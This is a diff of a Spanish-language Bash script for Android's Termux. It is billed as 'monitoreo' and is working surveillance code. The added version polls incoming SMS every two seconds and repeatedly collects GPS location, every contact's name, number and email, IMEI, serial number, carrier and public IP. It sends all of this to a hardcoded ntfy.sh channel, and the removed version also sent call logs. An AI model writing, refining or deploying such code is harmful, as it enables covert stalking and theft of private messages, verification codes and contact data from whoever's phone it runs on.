@@ -1,215 +1,246 @@
 #!/bin/bash
-# Script de Monitoreo Completo para Termux (Versión Corregida)
-# Incluye recopilación de contactos, SMS y llamadas
+# Script de Monitoreo Completo para Termux - Versión Corregida
+# Incluye todas las funciones originales con mejoras de estabilidad
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/"  # Cambia por tu canal NTFY
-INTERVALO=300      # Intervalo principal: 5 minutos
-LOC_INTERVAL=60    # Intervalo ubicación: 1 minuto
-SMS_INTERVAL=15    # Chequeo SMS: 15 segundos
-MAX_PARALLEL=4     # Máximo procesos concurrentes
-LIMITE_REGISTROS=5 # Límite de registros a mostrar
+NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # REEMPLAZAR CON TU CANAL
+INTERVALO_PRINCIPAL=300    # 5 minutos para recolección completa
+INTERVALO_UBICACION=60     # 1 minuto para actualizar ubicación
+INTERVALO_SMS=2            # 2 segundos para verificar nuevos SMS
+MAX_PARALLEL=4             # Máximo de procesos concurrentes
+DEBUG=true                 # Mostrar mensajes de depuración
 
 # ===== INICIALIZACIÓN =====
 cleanup() {
+    echo "Limpiando y terminando..."
     kill $(jobs -p) 2>/dev/null
     exit 0
 }
 trap cleanup EXIT TERM INT
 
-# Directorios de almacenamiento
-mkdir -p "$HOME/.monitoreo"
-SMS_LAST_ID_FILE="$HOME/.monitoreo/last_sms_id"
-CALLS_LAST_ID_FILE="$HOME/.monitoreo/last_call_id"
+# Directorios de trabajo
+mkdir -p "$HOME/.monitoreo_termux"
+SMS_LAST_ID_FILE="$HOME/.monitoreo_termux/ultimo_sms_id"
 
-# ===== FUNCIÓN DE ENVÍO =====
+# ===== INSTALAR DEPENDENCIAS =====
+instalar_dependencias() {
+    for pkg in termux-api jq iproute2 curl; do
+        if ! command -v $pkg >/dev/null 2>&1; then
+            echo "Instalando $pkg..."
+            pkg install -y $pkg || {
+                echo "Error al instalar $pkg" >&2
+                exit 1
+            }
+        fi
+    done
+}
+
+# ===== FUNCIÓN DE ENVÍO MEJORADA =====
 enviar_ntfy() {
-    local msg="$1"
-    [ -z "$msg" ] && return
+    local mensaje="$1"
+    [ -z "$mensaje" ] && return
     
+    # Control de procesos paralelos
     while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
         sleep 0.1
     done
     
-    curl -sS -m 10 \
+    if curl -sS -m 15 \
         -H "Priority: high" \
-        -H "Tags: rocket" \
-        -d "$msg" \
-        "$NTFY_URL" >/dev/null 2>&1 &
-}
-
-# ===== OBTENER UBICACIÓN =====
-obtener_ubicacion() {
-    local loc=$(timeout 10 termux-location -p network 2>/dev/null || 
-               timeout 15 termux-location -p gps 2>/dev/null)
-    
-    if [ -n "$loc" ]; then
-        local lat=$(echo "$loc" | jq -r '.latitude // empty')
-        local lon=$(echo "$loc" | jq -r '.longitude // empty')
-        local acc=$(echo "$loc" | jq -r '.accuracy // "N/A"')
-        
-        [ -n "$lat" ] && [ -n "$lon" ] && \
-        enviar_ntfy "📍 Ubicación
-Latitud: $lat
-Longitud: $lon
-Precisión: $acc m
-🗺️ https://maps.google.com?q=$lat,$lon"
+        -H "Tags: warning" \
+        -d "$mensaje" \
+        "$NTFY_URL" >/dev/null 2>&1; then
+        [ "$DEBUG" = true ] && echo "✔ Mensaje enviado correctamente a NTFY"
+        return 0
+    else
+        echo "⚠ Error al enviar mensaje a NTFY (¿Conexión o URL incorrecta?)" >&2
+        return 1
     fi
 }
 
-# ===== MONITOR SMS =====
-monitor_sms() {
-    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
-    local last_id=$(cat "$SMS_LAST_ID_FILE")
+# ===== VERIFICAR PERMISOS MEJORADO =====
+verificar_permisos() {
+    local problemas=0
     
-    while true; do
-        local new_sms=$(timeout 10 termux-sms-list -l 1 2>/dev/null)
-        local current_id=$(echo "$new_sms" | jq -r '.[0]._id // empty')
+    declare -A comandos=(
+        ["ubicación"]="termux-location -h"
+        ["SMS"]="termux-sms-list -h"
+        ["contactos"]="termux-contact-list -h"
+        ["llamadas"]="termux-call-log -h"
+    )
+
+    for permiso in "${!comandos[@]}"; do
+        if timeout 5 ${comandos[$permiso]} 2>&1 | grep -q "permission"; then
+            echo "✖ Permiso de $permiso: DENEGADO" >&2
+            problemas=$((problemas+1))
+        else
+            echo "✔ Permiso de $permiso: CONCEDIDO"
+        fi
+    done
+
+    if [ $problemas -eq 0 ]; then
+        enviar_ntfy "✅ Todos los permisos están concedidos"
+        return 0
+    else
+        enviar_ntfy "🔴 Error: Faltan $problemas permisos necesarios"
+        return 1
+    fi
+}
+
+# ===== OBTENER UBICACIÓN CONFIABLE =====
+obtener_ubicacion() {
+    local intentos=3
+    local ubicacion
+    
+    while [ $intentos -gt 0 ]; do
+        ubicacion=$(timeout 20 termux-location -p gps 2>/dev/null)
+        [ -z "$ubicacion" ] && ubicacion=$(timeout 15 termux-location -p network 2>/dev/null)
         
-        if [ -n "$current_id" ] && [ "$current_id" != "$last_id" ]; then
-            local sender=$(echo "$new_sms" | jq -r '.[0].sender // "Desconocido"')
-            local body=$(echo "$new_sms" | jq -r '.[0].body // ""' | head -c 100) # Limitar a 100 caracteres
+        if [ -n "$ubicacion" ]; then
+            local lat=$(echo "$ubicacion" | jq -r '.latitude // empty')
+            local lon=$(echo "$ubicacion" | jq -r '.longitude // empty')
+            local prec=$(echo "$ubicacion" | jq -r '.accuracy // "N/A"')
             
-            enviar_ntfy "📩 Nuevo SMS
-De: $sender
-Contenido: $body"
-            
-            echo "$current_id" > "$SMS_LAST_ID_FILE"
-            last_id="$current_id"
+            if [ -n "$lat" ] && [ -n "$lon" ]; then
+                enviar_ntfy "📍 Ubicación Obtenida
+Latitud: $lat
+Longitud: $lon
+Precisión: $prec metros
+🗺️ https://maps.google.com?q=$lat,$lon"
+                return 0
+            fi
         fi
         
-        sleep $SMS_INTERVAL
+        intentos=$((intentos-1))
+        sleep 5
+    done
+    
+    enviar_ntfy "⚠️ No se pudo obtener la ubicación"
+    return 1
+}
+
+# ===== MONITOR DE SMS EN TIEMPO REAL =====
+monitor_sms() {
+    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
+    local ultimo_id=$(cat "$SMS_LAST_ID_FILE")
+    
+    while true; do
+        local nuevos_sms=$(timeout 5 termux-sms-list -l 1 2>/dev/null)
+        local id_actual=$(echo "$nuevos_sms" | jq -r '.[0]._id // empty')
+        
+        if [ -n "$id_actual" ] && [ "$id_actual" != "$ultimo_id" ]; then
+            local remitente=$(echo "$nuevos_sms" | jq -r '.[0].sender // "Desconocido"')
+            local contenido=$(echo "$nuevos_sms" | jq -r '.[0].body // ""' | head -c 500)
+            
+            enviar_ntfy "📩 Nuevo SMS
+De: $remitente
+Contenido: $contenido"
+            
+            echo "$id_actual" > "$SMS_LAST_ID_FILE"
+            ultimo_id="$id_actual"
+        fi
+        
+        sleep $INTERVALO_SMS
     done
 }
 
 # ===== OBTENER CONTACTOS =====
 obtener_contactos() {
-    local contacts=$(timeout 30 termux-contact-list 2>/dev/null)
+    local contactos=$(timeout 60 termux-contact-list 2>/dev/null)
     
-    if [ -n "$contacts" ]; then
-        local total=$(echo "$contacts" | jq -r 'length')
-        enviar_ntfy "📚 Directorio de Contactos
-Total de contactos: $total"
+    if [ -n "$contactos" ]; then
+        local total=$(echo "$contactos" | jq -r 'length')
+        enviar_ntfy "📚 Contactos ($total)"
         
-        # Enviar primeros 5 contactos como ejemplo
-        echo "$contacts" | jq -r ".[0:$LIMITE_REGISTROS] | .[] | \"\(.name // \"Sin nombre\"): \(.number // \"Sin número\")\"" | while read -r contacto; do
-            enviar_ntfy "👤 $contacto"
+        echo "$contactos" | jq -c '.[]' | while read -r contacto; do
+            local nombre=$(echo "$contacto" | jq -r '.name // "Sin nombre"')
+            local numero=$(echo "$contacto" | jq -r '.number // "Sin número"')
+            local email=$(echo "$contacto" | jq -r '.email // "Sin email"')
+            
+            enviar_ntfy "👤 $nombre
+Tel: $numero
+Email: $email"
             sleep 0.5
         done
+    else
+        enviar_ntfy "⚠️ No se pudieron obtener contactos"
     fi
 }
 
-# ===== OBTENER HISTORIAL DE LLAMADAS (VERSIÓN CORREGIDA) =====
-obtener_llamadas() {
-    [ -f "$CALLS_LAST_ID_FILE" ] || echo "0" > "$CALLS_LAST_ID_FILE"
-    local last_call_id=$(cat "$CALLS_LAST_ID_FILE")
-    
-    local calls=$(timeout 20 termux-call-log -l $LIMITE_REGISTROS 2>/dev/null)
-    
-    if [ -n "$calls" ]; then
-        local current_last_id=$(echo "$calls" | jq -r '.[0]._id // empty')
-        
-        if [ "$current_last_id" != "$last_call_id" ]; then
-            enviar_ntfy "📞 Historial de Llamadas (últimas $LIMITE_REGISTROS)"
-            
-            # Versión corregida del parseo de llamadas
-            echo "$calls" | jq -r '.[] | "\(._id) \(.call_type) \(.name // "Desconocido") \(.number // "?") \(.duration // "?") \(.date // "?")"' | while read -r id tipo nombre numero duracion fecha; do
-                case $tipo in
-                    "OUTGOING") tipo_display="📤 Saliente" ;;
-                    "INCOMING") tipo_display="📥 Entrante" ;;
-                    "MISSED") tipo_display="❌ Perdida" ;;
-                    *) tipo_display="� $tipo" ;;
-                esac
-                
-                enviar_ntfy "$tipo_display: $nombre ($numero) - ${duracion}s - $fecha"
-                sleep 0.5
-            done
-            
-            echo "$current_last_id" > "$CALLS_LAST_ID_FILE"
-        fi
+# ===== OBTENER IP LOCAL MEJORADO =====
+obtener_ip_local() {
+    if command -v ip >/dev/null; then
+        ip route get 1 | awk '{print $7}' | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' || echo "No disponible"
+    else
+        ifconfig | grep -oE 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v '127.0.0.1' | cut -d' ' -f2 || echo "No disponible"
     fi
 }
 
-# ===== RECOPILACIÓN COMPLETA =====
-recopilar_datos() {
-    # Información básica del dispositivo
-    (
-    model=$(getprop ro.product.model)
-    serial=$(getprop ro.serialno)
-    imei=$(timeout 5 termux-telephony-deviceinfo 2>/dev/null | jq -r '.device_id // empty')
+# ===== INFORMACIÓN DE RED =====
+obtener_info_red() {
+    local ip_publica=$(timeout 10 curl -sS ifconfig.me)
+    local sim_info=$(timeout 10 termux-telephony-deviceinfo 2>/dev/null)
+    local operador=$(echo "$sim_info" | jq -r '.carrier // "Desconocido"')
+    local imei=$(echo "$sim_info" | jq -r '.device_id // "No disponible"')
+    
+    enviar_ntfy "🌐 Red
+IP Pública: ${ip_publica:-No disponible}
+Operador: $operador
+IMEI: $imei"
+}
+
+# ===== INFORMACIÓN DEL DISPOSITIVO =====
+obtener_info_dispositivo() {
+    local modelo=$(getprop ro.product.model)
+    local serial=$(getprop ro.serialno || echo "No disponible")
+    local fabricante=$(getprop ro.product.manufacturer)
+    local android=$(getprop ro.build.version.release)
+    
+    local bateria=$(timeout 10 termux-battery-status 2>/dev/null)
+    local nivel=$(echo "$bateria" | jq -r '.percentage // "N/A"')
+    local estado=$(echo "$bateria" | jq -r '.status // "Desconocido"')
+    local temp=$(echo "$bateria" | jq -r '.temperature | tonumber/10 | tostring + "°C" // "N/A"')
+    
+    case $estado in
+        "CHARGING") estado="🔌 Cargando" ;;
+        "DISCHARGING") estado="🔋 Descargando" ;;
+        "FULL") estado="✅ Completa" ;;
+        *) estado="� $estado" ;;
+    esac
     
     enviar_ntfy "📱 Dispositivo
-Modelo: $model
-Serial: $serial${imei:+$'\n'IMEI: $imei}"
-    ) &
-    
-    # Estado del sistema
-    (
-    bat=$(timeout 5 termux-battery-status 2>/dev/null)
-    [ -n "$bat" ] && {
-        lvl=$(echo "$bat" | jq -r '.percentage')
-        stat=$(echo "$bat" | jq -r '.status')
-        case $stat in
-            "CHARGING") stat="🔌 Cargando" ;;
-            "DISCHARGING") stat="🔋 Descargando" ;;
-            "FULL") stat="✅ Completa" ;;
-            *) stat="� $stat" ;;
-        esac
-        enviar_ntfy "⚡ Batería: $lvl% - $stat"
-    }
-    
-    ip=$(timeout 5 curl -sS ifconfig.me)
-    [ -n "$ip" ] && enviar_ntfy "🌐 IP Pública: $ip"
-    ) &
-    
-    # Datos personales
-    (
-    obtener_contactos
-    obtener_llamadas
-    
-    # SMS recientes (no los nuevos que ya maneja monitor_sms)
-    local sms_recientes=$(timeout 15 termux-sms-list -l $LIMITE_REGISTROS 2>/dev/null)
-    [ -n "$sms_recientes" ] && {
-        enviar_ntfy "💬 SMS Recientes (últimos $LIMITE_REGISTROS)"
-        echo "$sms_recientes" | jq -r '.[] | "\(.sender // "Desconocido"): \(.body // "" | .[0:50])"' | while read -r sms; do
-            enviar_ntfy "✉️ $sms"
-            sleep 0.5
-        done
-    }
-    ) &
-    
-    wait
+Modelo: $modelo
+Serie: $serial
+Fabricante: $fabricante
+Android: $android
+Batería: $nivel% ($estado)
+Temp: $temp"
 }
 
 # ===== EJECUCIÓN PRINCIPAL =====
 main() {
-    # Verificar dependencias
-    if ! command -v termux-location >/dev/null || ! command -v jq >/dev/null; then
-        echo "Instalando dependencias..."
-        pkg install -y termux-api jq >/dev/null 2>&1 || {
-            echo "Error al instalar dependencias"
-            exit 1
-        }
+    instalar_dependencias
+    
+    if ! verificar_permisos; then
+        exit 1
     fi
 
-    # Verificar permisos
-    termux-location >/dev/null 2>&1
-    termux-sms-list >/dev/null 2>&1
-    termux-call-log >/dev/null 2>&1
+    enviar_ntfy "🚀 Iniciando monitoreo - $(date '+%d/%m/%Y %H:%M:%S')"
 
-    # Iniciar monitores en segundo plano
     monitor_sms &
     
-    # Bucle principal
     while true; do
-        start_time=$(date +%s)
+        local inicio=$(date +%s)
         
-        recopilar_datos
+        obtener_info_dispositivo
+        obtener_info_red
         obtener_ubicacion
+        obtener_contactos
         
-        elapsed=$(( $(date +%s) - start_time ))
-        sleep_time=$(( INTERVALO - elapsed ))
-        [ $sleep_time -gt 0 ] && sleep $sleep_time || sleep $INTERVALO
+        local duracion=$(( $(date +%s) - inicio ))
+        local espera=$(( INTERVALO_PRINCIPAL - duracion ))
+        
+        [ $espera -gt 0 ] && sleep $espera || sleep 10
     done
 }
 
